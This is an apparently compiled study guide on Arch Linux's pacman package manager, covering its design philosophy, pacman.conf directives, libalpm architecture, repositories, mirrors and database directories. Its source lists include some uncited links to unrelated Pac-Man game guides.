# Syllabus

## Fundamentals

**Basic Concepts**
- Package management philosophy in Arch Linux[1]
- Pacman architecture and design[1]
- Configuration file structure (`/etc/pacman.conf`)[2]
- Repository system and mirror lists[3]

**Core Directory Structure**
- Database directory (`/var/lib/pacman/`)[3]
- Cache directory (`/var/cache/pacman/pkg/`)[2]
- Log files and locations[2]
- Configuration directories[3]
- Hook directories[2]

## Package Operations

**Installation and Removal**
- Installing packages from repositories[4]
- Removing packages and dependencies[4]
- Group installations[1]
- Force operations and overrides[1]

**Querying and Information**
- Searching for packages[5]
- Listing installed packages[5]
- Package information retrieval[5]
- File ownership queries[6]
- Dependency trees[1]

**System Updates**
- Full system upgrades[7]
- Partial upgrades (risks and considerations)[1]
- Downgrading packages[8]
- Update strategies[7]

## Advanced Operations

**Database Management**
- Synchronizing package databases[3]
- Database integrity checks[1]
- Orphaned package detection[8]
- Database corruption recovery[3]

**Cache Management**
- Cache cleaning strategies[9]
- Partial cache cleaning[9]
- Cache directory management[2]
- Disk space optimization[8]

**Package Files**
- Installing from local files[1]
- Package building integration[1]
- Archive extraction[1]
- File verification[1]

## Security and Validation

**Signature Verification**
- GPG key management[2]
- Package signature checking[2]
- Keyring operations[1]
- Trust database management[2]

**Package Integrity**
- Checksum verification[1]
- Corrupted package handling[1]
- Conflicting files resolution[1]

## Configuration and Customization

**Pacman Configuration**
- Repository configuration[2]
- Options and flags[2]
- Ignore and hold packages[8]
- Custom mirror configurations[3]

**Hooks System**
- Alpm hooks structure[2]
- Creating custom hooks[2]
- Hook execution order[2]
- System and user hooks[2]

## Performance and Optimization

**Download Management**
- Parallel downloads[8]
- Mirror ranking and selection[8]
- Download timeout configuration[2]
- Bandwidth management[2]

**Speed Optimization**
- Database optimization[8]
- Cache strategies[8]
- Color and verbosity settings[2]

## Troubleshooting

**Common Issues**
- Lock file handling[1]
- Failed transactions[1]
- Dependency conflicts[1]
- Broken packages[1]

**Recovery Procedures**
- System recovery from failed updates[8]
- Package cache utilization for recovery[8]
- Manual intervention scenarios[1]
- Chroot environment operations[3]

## Integration and Workflow

**AUR Integration**
- Understanding pacman vs AUR helpers[10]
- Workflow with AUR helpers[4]
- Manual AUR package building[10]

**System Maintenance**
- Regular maintenance routines[8]
- Log analysis[11]
- System health monitoring[1]
- Automated maintenance scripts[8]

## Advanced Topics

**Pacman Development**
- Libalpm library understanding[2]
- Custom wrapper development[10]
- Scripting with pacman[8]

**Repository Management**
- Custom repository creation[1]
- Local repository setup[8]
- Repository signing[1]

**Special Use Cases**
- Offline package management[8]
- Chroot installations[3]
- Cross-architecture scenarios[1]
- Container and minimal installations[1]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[3] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[4] Beginner's Guide to Pacman and AUR Helpers on Arch Linux https://www.tecmint.com/arch-linux-package-management/
[5] Arch Linux Pacman: A Detailed Guide with Commands and Examples https://dev.to/snigdhaos/arch-linux-pacman-a-detailed-guide-with-commands-and-examples-en5
[6] How to find where a package is installed by pacman? - Stack Overflow https://stackoverflow.com/questions/22681578/how-to-find-where-a-package-is-installed-by-pacman
[7] Understanding pacman -Syu Command in Arch Linux - It's FOSS https://itsfoss.com/pacman-syu/
[8] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[9] Pacman commands: pacman -Sc and pacman -Scc - Newbie https://forum.endeavouros.com/t/pacman-commands-pacman-sc-and-pacman-scc/872
[10] How do you learn how pacman & AUR helpers work? - Reddit https://www.reddit.com/r/archlinux/comments/ncofi1/how_do_you_learn_how_pacman_aur_helpers_work/
[11] How to Use Pacman in Arch Linux https://smarttech101.com/how-to-use-pacman-in-arch-linux
[12] Pac-Man Play Guide - Classic Gaming https://classicgaming.cc/classics/pac-man/play-guide
[13] Pac-Man - Strategy Guide - Arcade Games - By NessEggman https://gamefaqs.gamespot.com/arcade/589548-pac-man/faqs/43959
[14] Pac-Man 99: The Comprehensive Beginner's Guide : r/PACMAN99 https://www.reddit.com/r/PACMAN99/comments/mn8s8y/pacman_99_the_comprehensive_beginners_guide/
[15] Pac-Man - Guide to Mastering the Maze! - Steam Community https://steamcommunity.com/sharedfiles/filedetails/?id=593226813
[16] Master Pac-Man in Python: Your Ultimate Guide to Game ... - Codingal https://www.codingal.com/coding-for-kids/blog/master-pac-man-in-python-your-ultimate-guide-to-game-development/
[17] How to Make Pac-Man on Scratch https://codakid.com/blog/how-to-make-pac-man-on-scratch/
[18] How to Make Pac-Man in Python! https://www.youtube.com/watch?v=9H27CimgPsQ
[19] [PDF] How to Win at Pac-Man https://www.digitpress.com/library/books/book_how_to_win_at_pac-man.pdf
[20] "Advanced" tips for Pac-Man? : r/CrazyHand https://www.reddit.com/r/CrazyHand/comments/2j61tw/advanced_tips_for_pacman/
[21] Pacman Trainer: Classroom-Ready Deep Learning from Data ... https://people.csail.mit.edu/korpusik/asee22_pacman.pdf

# Basic Concepts

## Package Management Philosophy in Arch Linux

### KISS Principle

Arch Linux follows the KISS (Keep It Simple, Stupid) principle as its foundational philosophy. Simplicity in Arch is defined as "without unnecessary additions or modifications". This means shipping software as released by upstream developers with minimal distribution-specific downstream changes. Patches not accepted by upstream are avoided, and downstream patches consist almost entirely of backported bug fixes.[1][2]

The pacman package manager embodies this KISS philosophy in its design and implementation. It provides simple binary package format combined with an easy-to-use build system, making package management straightforward and maintainable.[3][4][5]

### Pragmatism Over Ideology

Arch is a pragmatic distribution rather than an ideological one. The principles serve as useful guidelines rather than strict rules. Design decisions prioritize practical functionality over adherence to particular ideologies.[6][1]

### Rolling Release Model

Arch Linux employs a rolling release model, also known as continuous delivery. This means users receive continuous updates without needing major version upgrades or system reinstallation. New packages and updates roll in constantly, with significant changes occurring at any time.[2][7][8]

Only one version of each package is supported at any given time, which means partial upgrades are not supported. This single-version policy allows everyone to be on the same version of everything, enabling bugs to be found and fixed faster with fewer version combinations requiring testing.[4]

### Modernity

Arch Linux strives to maintain the latest stable release versions of software as long as systemic package breakage can be reasonably avoided. The distribution incorporates cutting-edge kernels and modern features available to GNU/Linux users, including systemd, modern file systems, LVM2, software RAID, and udev support. Arch does not retain outdated components when modern, future-proof alternatives exist.[1]

### Minimalism and User-Centricity

Arch provides a minimal base installation with only essential components: command-line interface, pacman package manager, basic device availability, and documentation. The distribution does not add automation features such as enabling services simply because a package was installed. Packages are only split when compelling advantages exist, such as saving disk space.[2][1]

The system empowers users to build customized environments by selecting from thousands of high-quality packages in official repositories rather than providing unwanted preinstalled software.[8][2]

### Command-Line Focus

Arch Linux official packages do not provide system-wide GUI configuration utilities. There is neither a GUI installation wizard nor GUI system configuration tools. The distribution encourages users to perform most system configuration from the command-line shell and text editor. Pacman itself is a command-line program, not a GUI application.[3][1]

### Upstream Configuration Respect

Arch ships configuration files as provided by upstream with changes limited to distribution-specific issues like adjusting system file paths. This approach preserves the original developers' intentions and reduces unnecessary complexity.[1]

### Dependency Management Philosophy

Pacman does not perform version dependency resolution because only one version of each package is supported at any time. While pacman supports versioned dependencies technically, Arch uses them only in select cases where absolutely necessary. This simplified approach contributes to faster package operations and system stability.[4]

### Server-Client Synchronization

Pacman maintains system currency by synchronizing package lists with master servers. This server-client model allows users to download and install packages with simple commands, complete with all required dependencies. The synchronization approach ensures the entire user base operates on consistent package versions.[3][4]

Sources
[1] Arch Linux - ArchWiki https://wiki.archlinux.org/title/Arch_Linux
[2] Exploring What Is Arch Linux: User Base And Unique Features https://www.milesweb.com/blog/hosting/vps/what-is-arch-linux/
[3] Arch Linux a different type of Linux https://www.lions-wing.net/lessons/arch-linux/arch.html
[4] I just switched from Ubuntu to Arch linux. Can someone ... https://www.reddit.com/r/archlinux/comments/lpema0/i_just_switched_from_ubuntu_to_arch_linux_can/
[5] Packagecloud with Archlinux https://blog.packagecloud.io/resources/packagecloud-with-archlinux/
[6] Understanding Arch Philosophy : r/archlinux - Reddit https://www.reddit.com/r/archlinux/comments/bmn34z/understanding_arch_philosophy/
[7] Rolling release - Wikipedia https://en.wikipedia.org/wiki/Rolling_release
[8] What is Arch Linux? A Powerful and Customizable Linux Distribution https://www.webasha.com/blog/what-is-arch-linux-a-powerful-and-customizable-linux-distribution-features-differences-and-real-world-applications
[9] Arch Linux - Wikipedia https://en.wikipedia.org/wiki/Arch_Linux
[10] Arch Linux - What you need to know https://www.ionos.com/digitalguide/server/configuration/arch-linux/

## Configuration File Structure (`/etc/pacman.conf`)

### File Overview

The `/etc/pacman.conf` file is the main configuration file for the pacman package manager. Pacman, using libalpm, reads this configuration file each time it is invoked. The file controls both global behavior and repository-specific settings.[3]

### Basic Syntax Rules

All directive names must be written in CamelCase. Incorrect casing such as `noupgrade` or `NOUPGRADE` will not be recognized. Comments are supported only by beginning a line with the hash (`#`) symbol and cannot begin in the middle of a line.[11][3]

The configuration file is divided into sections or repositories. Each section is defined by a name within square brackets.[3]

### File Structure

The configuration file consists of two main types of sections: the `[options]` section and repository sections.[3]

### Options Section

The `[options]` section defines global options that apply to pacman's overall behavior. This section appears at the beginning of the configuration file and is the only section that does not define a package repository.[3]

**Key Directives:**

**RootDir:** Specifies the root directory for all pacman operations, defaulting to `/`.[12]

**DBPath:** Sets the database directory path where pacman stores information about installed packages, defaulting to `/var/lib/pacman/`.[12]

**CacheDir:** Defines where pacman stores downloaded package files, defaulting to `/var/cache/pacman/pkg/`. Multiple cache directories can be specified and are tried in the order listed.[1][11]

**LogFile:** Specifies the location of the pacman log file, defaulting to `/var/log/pacman.log`.[11]

**GPGDir:** Sets the directory containing GnuPG configuration files for package signature verification, defaulting to `/etc/pacman.d/gnupg/`.[11]

**HookDir:** Specifies directories to search for alpm hooks in addition to the system hook directory, defaulting to `/etc/pacman.d/hooks/`.[11]

**HoldPkg:** Lists packages that pacman should not remove unless explicitly overridden, typically including critical system packages.[5][3]

**IgnorePkg:** Specifies packages that should not be upgraded during system updates.[13]

**IgnoreGroup:** Lists package groups that should be ignored during updates.[13]

**NoUpgrade:** Prevents specified files from being upgraded, preserving local modifications.[3]

**NoExtract:** Prevents specified files from being extracted from packages during installation.[3]

**Architecture:** Defines the system architecture, typically auto-detected.[3]

**Color:** Enables colored output in pacman.[11]

**TotalDownload:** Shows the total download size in package operations.[11]

**CheckSpace:** Performs a disk space check before installing packages.[11]

**VerbosePkgLists:** Displays additional package information during operations.[11]

**ParallelDownloads:** Enables downloading multiple packages simultaneously, with a numeric value specifying the maximum concurrent downloads.[13]

**SigLevel:** Defines the default signature verification level for packages.[3]

### Repository Sections

Each repository section defines a package repository that pacman can use when searching for packages in sync mode. Repository sections follow the `[options]` section in the configuration file.[3]

**Section Names:**

Repository names are defined by strings within square brackets, such as `[core]` and `[extra]`. Repository names must be unique, and the name `local` is reserved for the database of installed packages.[3]

The order of repositories in the configuration file matters significantly. Repositories listed first take precedence over those listed later when packages in two repositories have identical names, regardless of version number.[3]

**Repository Directives:**

**Server:** Defines the URL location where packages can be found. Multiple `Server` directives can be specified for redundancy. URLs follow standard naming conventions, and local directories can be specified using the `file://` prefix.[3]

**Include:** References an external file containing repository server definitions, commonly used to include mirrorlist files. A typical usage is `Include = /etc/pacman.d/mirrorlist`.[3]

**CacheServer:** Specifies alternative cache servers for package downloads.[3]

**SigLevel:** Overrides the global signature verification level for a specific repository.[3]

**Usage:** Defines how the repository should be used with options including Sync, Search, Install, Upgrade, and All. This allows fine-grained control over repository usage for different operations.[3]

### Variable Interpolation

During parsing, pacman defines the `$repo` variable to the name of the current section. This is commonly utilized in files specified using the `Include` directive so all repositories can use the same mirrorfile.[3]

Pacman also defines the `$arch` variable to the first (or only) value of the Architecture option, allowing the same mirrorfile to be used for different architectures.[3]

**Example:**
```
Server = https://mirror.example.com/$repo/os/$arch
```

This expands to the appropriate repository name and architecture automatically.[3]

### Configuration Example

```
# /etc/pacman.conf
[options]
NoUpgrade = etc/passwd etc/group etc/shadow
NoUpgrade = etc/fstab

[core]
Include = /etc/pacman.d/core

[custom]
Server = file:///home/pkgs
```


### Standard Repository Sections

Typical Arch Linux installations include the following repository sections in order:[8]

**[core]:** Contains essential packages required for a functional base system.[8]

**[extra]:** Provides additional packages that are officially supported.[8]

**[multilib]:** Contains 32-bit libraries for running 32-bit applications on 64-bit systems (optional, commented out by default).[8]

### Validation and Querying

The `pacman-conf` utility can be used to parse and query the configuration file in a script-friendly manner. It properly handles non-trivial configuration features such as variable interpolation and the Include directive.[5]

**Example:**
```
pacman-conf HoldPkg
pacman-conf -r core Usage
pacman-conf --repo-list
```


This utility guarantees output matching the configuration values that pacman itself would use.[5]

### Configuration File Relationship

The `/etc/pacman.conf` file works in conjunction with `/etc/pacman.d/mirrorlist`, which contains the list of servers for official package repositories. The mirrorlist is typically included via the `Include` directive in repository sections.[8][3]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Whats the content of the pacman.config file from a base ... https://www.reddit.com/r/archlinux/comments/rqifft/whats_the_content_of_the_pacmanconfig_file_from_a/
[3] pacman.conf(5) - Arch manual pages https://man.archlinux.org/man/pacman.conf.5.en
[4] pacman.conf https://gist.github.com/setkeh/4221991
[5] pacman-conf(8) - Arch manual pages https://man.archlinux.org/man/core/pacman/pacman-conf.8.en
[6] files/pacman.conf - system.linux.archlinux https://gitlab.mn.tu-dresden.de/sdm/system.linux.archlinux/-/blob/stable/files/pacman.conf
[7] Broken pacman.conf config - KDE https://forum.garudalinux.org/t/broken-pacman-conf-config/28856
[8] [SOLVED]/etc/pacman.conf and /etc/pacman.d/mirrorlist ... https://bbs.archlinux.org/viewtopic.php?id=278448
[9] How to Use Pacman in Arch Linux https://smarttech101.com/how-to-use-pacman-in-arch-linux
[10] Archlinux Cheat Sheet: Configuration Files Pacman Xorg ... https://www.scribd.com/document/379480808/archcheatsheet-pdf
[11] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[12] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[13] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks


## Pacman Architecture and Design

### Core Architecture

Pacman is written in the C programming language and employs a modular architecture that separates the package management library from the frontend interface. The architecture follows a client-server model where pacman synchronizes package lists with master servers, allowing users to download and install packages with complete dependency resolution.[1]

The system is designed around a simple binary package format combined with an easy-to-use build system, making package management straightforward while maintaining powerful functionality.[1]

### Libalpm Library

Libalpm is the shared library that provides the core functionality for all package management operations. This library handles opening binary package repositories, downloading files, adding or removing packages to the local package database, and introspecting data about packages from the local database, remote repositories, or filesystem files.[2]

Pacman uses libalpm to read the configuration file each time it is invoked. The library provides a well-defined API that can be used by other frontends beyond the official pacman command-line tool. Various third-party tools including pacutils, packagekit plugins, AUR helpers, and GUI frontends all utilize libalpm as their backend.[3][2]

The alpm_list_t structure is a doubly-linked list provided publicly by libalpm for use in its routines, allowing frontends without native list types to utilize this data structure.[4]

### Frontend-Backend Separation

The library operates only a small set of well-defined operations, leaving high-level features to the frontend. Pacman serves as the official libalpm client frontend, but the architecture allows for multiple alternative frontends.[2][4]

During operations like system upgrades, libalpm returns the complete list of packages to be upgraded without making decisions about the content. The frontend inspects this list and can implement special actions, such as handling the case where pacman itself needs to be upgraded.[4]

### Package Format

Pacman uses the bsdtar(1) tar format for packaging. This format provides a simple, standardized way to distribute binary packages while maintaining compatibility with standard Unix archiving tools.[1]

The binary package format is designed for simplicity and ease of management, whether packages originate from official repositories or user-built sources.[1]

### Configuration System

The configuration system is divided into sections or repositories defined in /etc/pacman.conf. Each section defines a package repository that pacman can use when searching for packages in sync mode, with the exception of the options section which defines global options.[3]

All configuration directives must be written in CamelCase. Incorrect casing such as noupgrade or NOUPGRADE will not be recognized. Comments are supported only by beginning a line with the hash (#) symbol and cannot begin in the middle of a line.[3]

### Database Structure

The local package database maintained by libalpm stores information about all installed packages, package metadata, and the synchronized repository database. The database structure allows for efficient querying of package information, dependency relationships, and file ownership.[5][2]

The database design supports introspection of packages from multiple sources: the local database of installed packages, remote repository databases, and individual package files on the filesystem.[2]

### Dependency Management

The dependency resolution system operates on the principle that only one version of each package is supported at any given time. This design decision simplifies dependency management by eliminating the need for complex version resolution algorithms.[6]

When packages are installed or upgraded, libalpm automatically resolves all required dependencies and presents the complete transaction to the frontend for approval. The system downloads and installs packages with simple commands, complete with all required dependencies.[1]

### Transaction System

Package operations are performed through a transaction-based system. Libalpm builds complete transactions that include all packages to be installed, upgraded, or removed before any changes are made to the system. This approach ensures atomicity and allows for validation before committing changes.[4]

The frontend can inspect and modify transactions before they are executed, providing opportunities for user confirmation and special handling of specific packages.[4]

### Synchronization Mechanism

The server-client model keeps the system current by synchronizing package lists with master servers. This synchronization ensures that all users operate with consistent package versions and can access the latest available packages.[6][1]

Package lists are downloaded from configured repository servers and stored locally, allowing for offline queries and planning of package operations.[2]

### Tool Integration

The pacman package contains integrated tools including makepkg for building packages and vercmp for version comparison. Additional utilities such as pactree and checkupdates are provided in the pacman-contrib package.[1]

Makepkg, the shell script program which builds PKGBUILDs, depends on pacman to handle dependency resolution during the build process. This integration ensures consistency between package building and installation.[2]

### API Design

The libalpm API provides functions for all major package management operations. Functions like alpm_add_pkg() handle package installation while functions like alpm_pkg_download_size() provide package information. The API is designed to be comprehensive while remaining focused on core package management functionality.[2]

The public API allows frontend developers to create custom interfaces while relying on the robust, tested backend functionality provided by libalpm.[2]

### Modular Component Design

The architecture separates concerns into distinct components: package format handling, repository access, database management, dependency resolution, transaction processing, and frontend interface. Each component can be developed and tested independently while working together through well-defined interfaces.[2]

This modular design enables the creation of diverse frontends ranging from command-line tools to graphical interfaces, all utilizing the same underlying package management logic.[7][2]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] [Solved] Libalpm as a Library / Pacman & Package ... https://bbs.archlinux.org/viewtopic.php?id=257222
[3] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[4] andrewgregory/pacman https://github.com/andrewgregory/pacman
[5] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[6] I just switched from Ubuntu to Arch linux. Can someone ... https://www.reddit.com/r/archlinux/comments/lpema0/i_just_switched_from_ubuntu_to_arch_linux_can/
[7] What is it with Arch and having hilariously redundant CLI ... https://www.reddit.com/r/archlinux/comments/4ky3ff/what_is_it_with_arch_and_having_hilariously/
[8] Pacman installs dependency packages of the wrong ... https://forum.manjaro.org/t/pacman-installs-dependency-packages-of-the-wrong-architecture/36609
[9] PacMan on KR260: RTL approach for retrogaming https://www.makarenalabs.com/pacman-on-kr260-rtl-approach-for-retrogaming/
[10] How to manage packages in Manjaro Linux? - Tencent Cloud https://www.tencentcloud.com/techpedia/101947
[11] Pac-Man https://en.wikipedia.org/wiki/Pac-Man
[12] What goes into making a package manager? - Reddit https://www.reddit.com/r/learnprogramming/comments/3kl4fn/what_goes_into_making_a_package_manager/

## Repository System and Mirror Lists

### Repository Concept

A repository is a logical collection of packages that are physically stored on one or more servers. Each server hosting the repository files is called a mirror for the repository. Repositories are defined in `/etc/pacman.conf` where each section (except `[options]`) represents a separate package repository.[1][4]

### Repository Types

#### Official Repositories

Official repositories are maintained by Arch Linux developers and package maintainers. These repositories undergo strict quality control and package verification processes.[3]

#### Unofficial Repositories

Unofficial repositories are maintained by third parties and can be added to `/etc/pacman.conf` to access additional packages not available in official repositories.[1]

### Standard Official Repositories

#### core

The `core` repository is found in `.../core/os/` on mirror servers. This repository contains packages essential for:[3]

- Booting Arch Linux
- Connecting to the Internet
- Building packages
- Management and repair of supported file systems
- System setup processes (e.g., openssh)
- Dependencies of the above packages
- The base meta package

The `core` repository has strict quality requirements where developers and users must sign off on updates before packages are accepted. For low-usage packages, reasonable exposure periods are required, including informing users about updates, requesting signoffs, and keeping packages in core-testing for up to a week depending on change severity.[3]

#### extra

The `extra` repository is found in `.../extra/os/` on mirror servers. This repository contains all packages that do not fit in `core`. It is jointly maintained by Package Maintainers and Arch Developers.[3]

**Examples include:** Xorg, window managers, web browsers, media players, tools for working with languages such as Python and Ruby, and many others.[3]

#### multilib

The `multilib` repository is found in `.../multilib/os/` on mirror servers. This repository contains 32-bit software and libraries that can be used to run and build 32-bit applications on 64-bit installations.[3]

With the `multilib` repository enabled, 32-bit compatible libraries are located under `/usr/lib32/`. The repository is commented out by default and must be manually enabled.[3]

**Enabling multilib:**

Uncomment the `[multilib]` section in `/etc/pacman.conf`:

```
[multilib]
Include = /etc/pacman.d/mirrorlist
```


After enabling, upgrade the system and install desired multilib packages. All multilib packages can be listed with `pacman -Sl multilib`, and 32-bit library package names begin with `lib32-`.[3]

### Repository Precedence

The order of repositories in `/etc/pacman.conf` matters significantly. Repositories listed first take precedence over those listed later when packages in two repositories have identical names, regardless of version number.[4][1]

After adding a new repository, you must upgrade the whole system first before using it.[1]

### Repository Physical Structure

Official repositories use a pool directory structure to avoid duplication. All packages (i686, x86_64, and architecture-independent "any" packages) are stored in the pool directory, such as `ftp://ftp.archlinux.org/pool/`. Symlinks are then placed in the appropriate `$repo/os/$arch/` directories.[2]

The general structure follows:
```
repo/
  os/
    i686/
    x86_64/
```


### Mirror Lists

#### Mirrorlist File Location

Mirror lists for official repositories are stored in `/etc/pacman.d/mirrorlist`. This file contains the list of servers (mirrors) from which packages can be downloaded.[11][1]

#### Mirrorlist Inclusion

Repository sections in `/etc/pacman.conf` typically reference the mirrorlist file using the `Include` directive:[4][1]

```
[core]
Include = /etc/pacman.d/mirrorlist
```


This allows all repositories to share the same mirror list file.[1]

#### Mirror URL Structure

Mirror URLs follow standard naming conventions and support variable interpolation. Common variables include:[5][4]

**$repo:** Expands to the repository name (core, extra, multilib).[5][4]

**$arch:** Expands to the system architecture (x86_64, i686).[5][4]

**Example mirror entry:**
```
Server = http://mirror.us.leaseweb.net/archlinux/$repo/os/$arch
```


During parsing, pacman automatically replaces these variables with appropriate values.[12]

#### Mirror Protocols

Mirrors can use various protocols including HTTP, HTTPS, FTP, and file:// for local directories. Local repository mirrors can be specified using the file:// prefix with the full directory path.[4][5]

### Defining Repository Mirrors

Each repository section allows defining mirrors in two ways:[1]

#### Direct Server Definitions

Mirrors can be listed directly in the repository section using multiple `Server` directives:[4]

```
[core]
Server = ftp://ftp.archlinux.org/$repo/os/$arch
Server = http://mirror.example.com/$repo/os/$arch
```


#### External Mirror Files

Mirrors can be defined in a dedicated external file referenced through the `Include` directive. This is the standard approach for official repositories:[1][4]

```
[core]
Include = /etc/pacman.d/mirrorlist
```


### Mirror Selection Order

When multiple mirrors are specified, pacman tries them in the order listed. If a server is specified directly in the repository section, it is tried before mirrors from included files:[4]

```
[core]
# use this server first
Server = ftp://ftp.archlinux.org/$repo/os/$arch
# next use servers as defined in the mirrorlist below
Include = /etc/pacman.d/mirrorlist
```


### Mirror Configuration

Mirrors must be configured before using pacman for package operations. The default mirror list may be outdated and should be updated with appropriate mirrors based on geographical location and performance.[5]

After modifying the mirrorlist, update all package indexes with `pacman -Syu`.[5]

### Custom Repositories

Custom or personal repositories can be added to `/etc/pacman.conf` by defining new repository sections. Local repositories can be created using `repo-add` and referenced with file:// URLs.[2]

**Example custom repository:**
```
[custom]
Server = file:///home/pkgs
```


### Repository Security

Each repository can define its own signature verification level using the `SigLevel` directive. This overrides the global `SigLevel` setting defined in the `[options]` section.[1]

The default configuration `SigLevel = Required DatabaseOptional` enables signature verification for all packages on a global level. This adds an extra layer of security to package management operations.[1]

### Repository Database

When pacman synchronizes with repositories, it downloads repository database files that contain information about available packages. These databases are stored locally in `/var/lib/pacman/` and allow pacman to perform queries and determine available updates.[13]

### Cache Servers

Repositories can also define `CacheServer` directives to specify alternative cache servers for package downloads. This provides additional flexibility in mirror configuration and can improve download performance.[12]

### Repository Usage Control

The `Usage` directive in repository sections defines how the repository should be used. Options include:[12]

- **Sync:** Use for synchronizing package databases
- **Search:** Use when searching for packages
- **Install:** Use when installing packages
- **Upgrade:** Use when upgrading packages
- **All:** Enable for all operations

This allows fine-grained control over repository usage for different operations.[12]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Location of "any" packages in a local repository structure https://bbs.archlinux.org/viewtopic.php?id=163109
[3] Official repositories - ArchWiki https://wiki.archlinux.org/title/Official_repositories
[4] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[5] How to Use Pacman in Arch Linux https://www.atlantic.net/dedicated-server-hosting/how-to-use-pacman-in-arch-linux/
[6] Arch Linux https://en.wikipedia.org/wiki/Arch_Linux
[7] Arch User Repository - ArchWiki https://wiki.archlinux.org/title/Arch_User_Repository
[8] Install Arch in custom folder structure : r/archlinux https://www.reddit.com/r/archlinux/comments/qbzak6/install_arch_in_custom_folder_structure/
[9] Understanding pacman -Syu Command in Arch Linux https://itsfoss.com/pacman-syu/
[10] How to Use Pacman in Arch Linux https://smarttech101.com/how-to-use-pacman-in-arch-linux
[11] [SOLVED]/etc/pacman.conf and /etc/pacman.d/mirrorlist ... https://bbs.archlinux.org/viewtopic.php?id=278448
[12] pacman.conf(5) - Arch manual pages https://man.archlinux.org/man/pacman.conf.5.en
[13] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182


# Core Directory Structure

## Key Pacman Directories

When learning pacman in Arch Linux, understanding the directories it manages is essential for troubleshooting and system management. Here are the critical directories pacman handles:[2]

#### Database Directory
**`/var/lib/pacman/`** is the default database path where pacman stores information about all installed packages, package metadata, and the sync database. This directory is considered a core Arch Linux component and contains the state of your package management system.[2]

#### Cache Directory
**`/var/cache/pacman/pkg/`** is the default cache directory where pacman stores downloaded package files. Multiple cache directories can be specified, and they are tried in the order listed in the configuration. This is where `.pkg.tar.zst` package files accumulate over time.[1][5][6]

#### Log File
**`/var/log/pacman.log`** is the default location for the pacman log file, which records all package operations including installations, removals, and upgrades.[5][11]

#### Configuration and Hooks
**`/etc/pacman.d/`** contains pacman configuration files, including repository mirrors and the hooks subdirectory. The **`/etc/pacman.d/hooks/`** directory is the default location for custom alpm hooks.[5][2]

**`/usr/share/libalpm/hooks/`** is the system hook directory where default alpm hooks reside.[5]

#### GPG Directory
**`/etc/pacman.d/gnupg/`** is the default directory containing GnuPG configuration files for package signature verification. This directory contains `pubring.gpg` (public keys of packagers) and `trustdb.gpg` (trust database).[5]

#### Root Directory
**`/`** (RootDir) is the default root directory for all pacman operations, though this can be changed in `/etc/pacman.conf` for specialized use cases like chroot environments.[2]

All these paths can be customized by uncommenting and modifying the corresponding directives in `/etc/pacman.conf`.

## Database Directory (`/var/lib/pacman/`)

### Directory Purpose and Location

`/var/lib/pacman/` is the default toplevel database directory where pacman stores all package management information. This directory is considered a core Arch Linux component that maintains the state of the package management system. The location can be overridden using the `DBPath` directive in `/etc/pacman.conf`, though most users will not need to change this setting.[2][5]

### Database Structure Overview

The pacman databases are normally located at `/var/lib/pacman/sync`. For each repository specified in `/etc/pacman.conf`, there will be a corresponding database file located there. Database files are gzipped tar archives containing one directory for each package.[1]

### Subdirectories

#### sync Directory

The `sync` subdirectory contains synchronized repository databases downloaded from configured mirrors. Each repository has its own database file in this location, such as:[1]

- `core.db`
- `extra.db`
- `multilib.db`

These database files contain metadata about all packages available in their respective repositories.[1]

#### local Directory

The `local` subdirectory contains the database of installed packages. The repository name `local` is reserved specifically for this database. This directory maintains information about every package currently installed on the system.[5]

### Database File Format

Database files are gzipped tar archives. Each archive contains one directory per package, with the directory name following the format `packagename-version-release`.[1]

**Example structure for the which package:**
```
which-2.21-5
└── desc
```


The `desc` file contains metadata such as the package description, dependencies, file size, and MD5 hash.[1]

### Package Database Contents

Each package entry in the database contains comprehensive metadata including:[1]

- Package name and version
- Package description
- Dependency information
- File size information
- Checksum hashes (MD5)
- Installation scripts
- Conflict information
- Provides information
- Required by information

### Database File Extensions

A package database is a tar file, optionally compressed. Valid extensions are `.db` or `.files` followed by an archive extension of `.tar`, `.tar.gz`, `.tar.bz2`, `.tar.xz`, `.tar.zst`, or `.tar.Z`.[3]

The `.db` files contain basic package information, while `.files` databases contain complete file listings for all packages in the repository.[3]

### Required Directory Structure

When setting up custom pacman environments or chroot installations, several directories within `/var/lib/pacman/` must be created:[6]

```
var/
├── cache/
│   └── pacman/
├── lib/
│   └── pacman/
│       ├── sync/
│       └── local/
└── log/
```


This directory structure is essential for pacman to function properly.[6]

### Database Operations

#### Synchronization

When running `pacman -Sy`, pacman synchronizes the repository databases by downloading updated database files from configured mirrors and storing them in `/var/lib/pacman/sync/`. This ensures the local database reflects the current state of available packages in repositories.[9]

#### Database Queries

The database directory enables pacman to perform various query operations:[7]

- Listing installed packages from the local database
- Searching for packages in repository databases
- Checking package dependencies
- Determining file ownership
- Identifying orphaned packages

#### Database Integrity

Pacman relies on the integrity of files in `/var/lib/pacman/` for proper operation. Database corruption can prevent package operations and may require database recovery procedures.[2]

### Path Configuration

The database path can be configured in `/etc/pacman.conf` using the `DBPath` directive:[5][2]

```
DBPath = /path/to/db/dir
```


When `DBPath` is specified, it represents an absolute path and the root path is not automatically prepended. This allows complete control over database location for specialized use cases.[5]

### Relationship to RootDir

If the database path is not specified on the command line or in `pacman.conf`, its default location will be inside the root path specified by the `RootDir` directive. This ensures consistency when using pacman for chroot installations or managing alternate system roots.[5]

### Custom Repository Databases

When creating custom local repositories, the database file can be located anywhere, but it must be properly referenced in `/etc/pacman.conf`. The database and packages should be kept together for pacman to access them correctly.[3]

**Example custom repository configuration:**
```
[customrepo]
Server = file:///home/user/customrepo
```


The custom repository directory should contain both the database file (e.g., `customrepo.db.tar.zst`) and the package files.[3]

### Backup and Snapshot Considerations

